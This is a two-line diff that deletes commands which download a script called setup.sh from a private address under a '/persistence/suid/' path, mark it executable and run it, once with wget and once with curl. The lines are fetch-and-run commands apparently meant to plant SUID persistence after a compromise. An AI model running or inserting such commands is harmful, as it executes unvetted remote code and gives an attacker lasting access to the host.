@@ -1,2 +1,0 @@
-wget -q "http://10.2.45.121:11000/persistence/suid/setup.sh" && chmod +x setup.sh && ./setup.sh
-curl --silent "http://10.2.45.121:11000/persistence/suid/setup.sh" -o setup.sh && chmod +x setup.sh && ./setup.sh
